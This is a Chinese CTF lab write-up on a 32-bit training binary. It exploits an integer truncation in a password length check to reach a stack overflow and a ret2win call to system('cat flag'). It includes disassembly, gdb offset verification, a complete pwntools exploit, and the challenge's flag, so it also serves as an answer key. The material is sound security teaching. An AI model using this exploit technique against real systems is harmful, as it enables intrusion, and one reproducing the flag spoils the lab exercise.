# 实验二 3.1.4 int_overflow_task1 WriteUp

> 整数溢出 → 长度截断绕过校验 → 栈溢出 → ret2win 拿到 `system("cat flag")`

## 一、样本信息

| 项目 | 结果 |
|---|---|
| 文件名 | int_overflow_task1 |
| MD5 | 69dbbabf64ce85372b709825b083a020 |
| 类型 | ELF 32-bit LSB executable, Intel i386, dynamically linked |
| 保护 | Partial RELRO / **No canary** / **NX enabled** / **No PIE** (0x8048000) |
| 符号 | 未 strip，函数名全在 |

```
$ checksec --file=int_overflow_task1
RELRO      STACK CANARY    NX          PIE       Symbols  FILE
Partial    No canary found NX enabled  No PIE    85       int_overflow_task1
```

关键结论：**NX 开启** ⟹ 不能像 3.1.3 那样往栈上塞 shellcode 再跳过去；但程序里有现成的
`what_is_this()`，等于给定了一个 `system("cat flag")` 的后门函数（ret2win）。

## 二、程序行为

运行后是一个登录菜单：

```
-----------------
~~ Welcome to CTF! ~~
       1.Login
       2.Exit
Your choice: 1
Please input your username: admin
Hello admin
Please input your passwd: ****
Success            ← 密码长度通过校验
```

`.rodata` 里出现的字符串：`cat flag` / `Success` / `Invalid Password` / `Please input your username:` /
`Please input your passwd:`，说明密码校验通过后程序会去执行 `cat flag`。

## 三、静态分析

### 3.1 函数清单

```
0804868b T what_is_this      ← system("cat flag")
080486a4 T check_passwd      ← 漏洞函数
08048720 T login
080487ca T main
```

### 3.2 main

```asm
8048877  lea  eax,[ebp-0xc]        ; int choice
8048880  call __isoc99_scanf      ; scanf("%d", &choice)
8048888  mov  eax,[ebp-0xc]
804888b  cmp  eax,0x1 / je login
8048890  cmp  eax,0x2 / je exit
```

`main` 开头对 stdin/stdout/stderr 做了 `setbuf(..., NULL)`（关闭缓冲），这一点对远程利用很重要：
后面 `cat flag` 的输出会**立刻**发出来，不用担心进程崩溃导致缓冲区丢失。

### 3.3 login

```asm
8048720  push ebp / mov ebp,esp
8048723  sub  esp,0x228
8048730  lea  eax,[ebp-0x28]  ; char username[32]
8048734  call memset(.,0,0x20)
8048746  lea  eax,[ebp-0x228] ; char passwd[512]
804874d  call memset(.,0,0x200)

8048765  push 0x19            ; 只读 25 字节
804876a  lea  eax,[ebp-0x28]  ; 到 username[32] —— 25 < 32，安全
8048770  call read

8048778  push [ebp-0x28]      ; printf("Hello %s", username)  ← 带格式串，不是格式化字符串漏洞
8048784  call printf

804879c  push 0x199           ; read(0, passwd, 0x199=409)
80487a4  lea  eax,[ebp-0x228] ; passwd 缓冲区 512 字节，409 < 512，安全
80487ad  call read

80487bf  call check_passwd    ; 把 passwd 交给校验函数
```

两处 `read` 本身都不越界，用户名那一路还带了 `%s`，所以**不是**格式化字符串漏洞。
真正的坑在 `check_passwd`。

### 3.4 check_passwd（漏洞函数）

```asm
080486a4 <check_passwd>:
80486a7  sub  esp,0x18
80486aa  push DWORD PTR [ebp+0x8]   ; 参数 passwd
80486b0  call strlen                ; 返回 size_t（32 位，eax）
80486b8  mov  BYTE PTR [ebp-0x9],al ; ★ 只取最低 1 字节 —— 截断发生在这里
80486bb  cmp  BYTE PTR [ebp-0x9],0x3
80486bf  jbe  80486fc               ; len <= 3 -> Invalid Password
80486c1  cmp  BYTE PTR [ebp-0x9],0x8
80486c5  ja   80486fc               ; len >  8 -> Invalid Password
                                     ; 4 <= len <= 8 时：
80486cf  call puts("Success")
80486e8  push DWORD PTR [ebp+0x8]    ; src = passwd（用户输入）
80486ee  lea  eax,[ebp-0x14]         ; dst = passwd_buf（只有 20 字节！）
80486f2  call strcpy                 ; ★ 无长度限制地复制 → 栈溢出
```

对应 C 源码大致是：

```c
void check_passwd(char *passwd) {
    char passwd_buf[20];
    unsigned char passwd_len = strlen(passwd);   // ← size_t 塞进 unsigned char
    if (passwd_len >= 4 && passwd_len <= 8) {
        puts("Success");
        strcpy(passwd_buf, passwd);
    } else {
        puts("Invalid Password");
    }
}
```

## 四、漏洞原理：长度截断

`strlen()` 返回 `size_t`（32 位无符号），赋给 `unsigned char` 时只保留最低 8 位：

```
261 (0x105)  --截断-->  0x05  = 5
```

5 落在 `4 <= len <= 8` 里，于是"长度校验通过"，但 `strcpy` 复制的是**真实的 261 字节**，
直接冲垮 20 字节的 `passwd_buf`。

一般形式：只要输入长度为 `256*k + n`（`4 <= n <= 8`）就能通过校验。本实验取 `k=1, n=5`，
即 261 字节（和讲义 3.1.2 里 `int_overflow2` 的取值一致）。

## 五、偏移计算与验证

### 5.1 静态推算

```
passwd_buf 位于 ebp-0x14
保存的 ebp 位于 ebp
返回地址    位于 ebp+4
偏移 = 0x14 + 4 = 0x18 = 24
```

栈帧大致结构（高地址在上）：

```
       ┌────────────────────┐
ebp+8  │ 参数 passwd 指针    │
ebp+4  │ 返回地址  ← 目标    │ ← 距缓冲区 24 字节
ebp+0  │ 保存的 ebp          │
ebp-8  │ ...                 │
ebp-9  │ passwd_len(1 字节)  │
ebp-0x14│ passwd_buf(20 字节)│ ← 起点
       └────────────────────┘
```

### 5.2 动态验证（cyclic + core dump）

```python
p.sendline(cyclic(261))    # 261 + '\n' = 262，262 & 0xff = 6，仍在 4~8 内
```

崩溃后用 gdb 解析 core：

```
$ gdb -q ./int_overflow_task1 core.8254 -batch -ex "info registers eip esp ebp"
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x61616167 in ?? ()
eip            0x61616167
esp            0xffffcdf0
ebp            0x61616166
0xffffcdf0:     0x61616168  0x61616169  0x6161616a  0x6161616b
```

```
$ python3 -c "from pwn import *; print(cyclic_find(0x61616167))"
24
```

EIP 被覆盖成 cyclic 里的 `gaaa`(0x61616167)，偏移实测 **24**，与静态推算完全一致。

## 六、利用思路

1. **NX enabled** → 放弃"栈上 shellcode"方案（讲义 3.1.3 的做法在这里不成立）。
2. 程序自带的 `what_is_this()`（0x804868b）直接调用 `system("cat flag")`，等于
   "能控制 EIP 就等于拿到 flag" → 经典 **ret2win**。
3. payload 布局：

```
[ 'A'*24 ][ p32(0x804868b) ][ 'B' * 232 ]   ← 260 字节，sendline 再补 '\n' = 261
           ↑ 返回地址           ↑ 补齐到长度 261，保证 261 & 0xff = 5 通过校验
```

注意事项：
- 总长度必须是 `4..8 (mod 256)`，否则先被 "Invalid Password" 挡掉，根本走不到 `strcpy`。
- 因为 `sendline` 会多一个 `\n`，所以 payload 本体取 260 字节；`\n` 只是让 `read` 返回，
  也被一起计入 `strlen`。
- 覆盖后的 `ebp` 是 `0x41414141`，`what_is_this` 里 `system` 返回后 `leave; ret` 会崩，
  但 `setbuf(stdout, NULL)` 保证了 flag 已经打出来了，崩溃无所谓。

## 七、EXP

```python
#!/usr/bin/env python3
from pwn import *
import sys

context(arch='i386', os='linux', log_level='info')

D     = '/home/xlj/pwn/task1'
BIN   = D + '/int_overflow_task1'
WIN   = 0x804868b      # what_is_this -> system("cat flag")
OFF   = 24             # passwd_buf -> 返回地址
TOTAL = 261            # 261 & 0xff = 5

def start():
    if len(sys.argv) == 3:                    # python3 exp.py 172.28.52.12 30001
        return remote(sys.argv[1], int(sys.argv[2]))
    return process(BIN, cwd=D)

def build_payload():
    payload = b'A' * OFF + p32(WIN)
    payload = payload.ljust(TOTAL - 1, b'B')  # 260 + '\n' = 261
    assert len(payload) + 1 == TOTAL
    return payload

p = start()
p.recvuntil(b'Your choice:')
p.sendline(b'1')                # 1. Login
p.recvuntil(b'username:')
p.sendline(b'admin')            # read(0, username, 25)，安全
p.recvuntil(b'passwd:')
p.sendline(build_payload())     # 溢出
print(p.recvall(timeout=5).decode(errors='replace'))
```

## 八、运行结果

本地（自建一个 `flag` 文件验证代码执行，内容故意写成测试值）：

```
$ echo "flag{local_test_only}" > flag
$ python3 exp_task1.py
[+] Starting local process './int_overflow_task1': pid 8540
=== 程序输出 ===

Success
flag{local_test_only}
```

对照实验：删掉 `flag` 文件再打一次，输出变成 `cat: flag: No such file or directory`——
证明命中的确实是 `system("cat flag")`，而不是别的东西。

```
=== 程序输出 ===

Success
cat: flag: No such file or directory
```

远程（平台的 GZCTF 实例，`172.28.52.12:32828`）：

```
$ nc -vz 172.28.52.12 32828
(UNKNOWN) [172.28.52.12] 32828 (?) open        ← 端口是通的，PWN 题目连上不会有 banner，属于正常

$ python3 exp_task1.py 172.28.52.12 32828
[+] Opening connection to 172.28.52.12 on port 32828: Done
=== 程序输出 ===

Success
flag{dcda2bfe-916c-4b87-a38a-e0be678107ad}
```

**Flag：`flag{dcda2bfe-916c-4b87-a38a-e0be678107ad}`**（重跑两次，返回一致）

## 九、踩坑记录

1. **长度必须 `mod 256 ∈ [4,8]`**：随便塞 300 字节会被 `Invalid Password` 挡掉（300&0xff=44）。
2. **`sendline` 的换行也算长度**：payload 本体 260 字节，加上 `\n` 正好 261，多一个字节就变成 262→6，虽然还在区间内但偏移计算容易错位。
3. **NX 开启时不要照抄 3.1.3 的 shellcode 方案**，先 `checksec` 再决定打法；本题有后门函数直接 ret2win。
4. **core_pattern 是 `core`，实际生成的是 `core.<pid>`**，`ls core` 找不到，要 `ls core*`。
5. **WSL 里跑要先 `ulimit -c unlimited`**，否则不出 core dump。

## 十、一句话总结

`strlen` 的 `size_t` 结果被截断进 `unsigned char`，261 → 5 骗过了 `4 <= len <= 8` 的范围检查，
随后 `strcpy` 无长度限制地复制真实长度，24 字节覆盖返回地址；由于 NX 开启改用 ret2win，
跳到程序自带 `what_is_this()` 触发 `system("cat flag")`。
